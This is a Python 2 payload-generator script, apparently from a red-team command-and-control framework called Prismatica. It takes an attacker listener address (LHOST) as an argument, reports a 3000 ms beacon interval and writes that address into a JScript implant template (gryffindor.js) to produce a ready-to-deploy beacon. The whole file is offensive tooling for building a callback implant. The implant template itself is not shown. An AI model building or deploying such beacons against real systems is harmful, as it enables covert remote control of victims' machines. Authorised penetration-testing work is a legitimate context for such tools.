import os
import sys

print "Generating Gryffindor payload"
print ""

LHOST = sys.argv[1]


print "Payload Details:"
print "========================================="
print "LHOST: " + LHOST
print "BEACONTIME: 3000ms"
print "Saving payload to engagement directory"

from os.path import expanduser
home = expanduser("~")

prismdir = os.path.join(home, ".prismatica")
payload = os.path.join(prismdir, "gryffindor.js")
template = os.path.join(prismdir, "Diagon", "Arsenal", "templates", "gryffindor.js")


f = open(template, "r")
tmp = f.read()
w = open(payload, "w+")
w.write("var LHOST = '" + LHOST + "';\n")
w.close()
w = open(payload, "a")
w.write(tmp)
#print(f.read())

#os.system("copy C:\\Projects\\Prismatica\\Diagon\\Gryffindor\\wsh\\gryffindor.js C:\\Projects\\Prismatica\\gryffindor.js")

print "Saved to: " + payload
print "Complete!"
